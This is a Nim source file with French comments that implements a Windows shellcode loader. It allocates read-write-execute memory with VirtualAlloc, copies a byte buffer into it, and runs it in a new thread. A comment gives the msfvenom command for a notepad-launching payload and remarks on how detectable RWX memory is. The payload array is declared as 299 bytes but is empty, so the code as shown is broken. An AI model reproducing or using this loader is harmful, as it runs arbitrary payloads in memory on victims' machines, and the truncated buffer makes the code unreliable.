import winim/lean # On importe la librairie winim, il faut qu'elle soit installé : ('nimble install winim')


# On définie la fonction à executer
proc inject[I, T](shellcode: var array[I, T]): void =

    # On utilise la fonction VirtualAlloc() pour allouer de la mémoire dédier au shellcode 
    # On aurait pu utiliser VirtualProtect() pour rendre notre shellcode directement executable

    # On alloue les droits ecriture, lecture et execution (RWX) à la memoire (cela rend le shellcode facilement détéctable) 
    let shellcode_memory = VirtualAlloc(
        nil,
        len(shellcode),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    # on  copie le shellcode (donné en paramètre de la fonction) dans la mémoire alloué préalablement via VirtualAlloc()
    copyMem(shellcode_memory, shellcode[0].addr, len(shellcode))

    # On crée le thread pour executer le shellcode
    let thread = CreateThread(
        nil, 
        0,
        cast[LPTHREAD_START_ROUTINE](shellcode_memory),
        nil,
        0, 
        cast[LPDWORD](0)
    )
    # On utilise Defer pour fermer le handle du thread automatiquement
    defer: CloseHandle(thread)

    # Wait for our thread to exit to prevent program from closing before the shellcode ends
    # On attent la fermeture du thread pour éviter une fermeture précipité avant la fin du shellcode
    discard WaitForSingleObject(thread, -1)

# S'execute uniquement lorsque compilé pour windows
when defined(windows):
    # Le shellcode est un tableau de byte nim
    # J'ouvre l'application bloc-note
    # msfvenom -p windows/x64/exec CMD="C:\windows\system32\notepad.exe" EXITFUNC=thread -f nim
    var buf: array[299, byte] = [
    byte  ]


    # On appelle notre fonction d'injection en tant que fonction principale
    when isMainModule:
        inject(buf)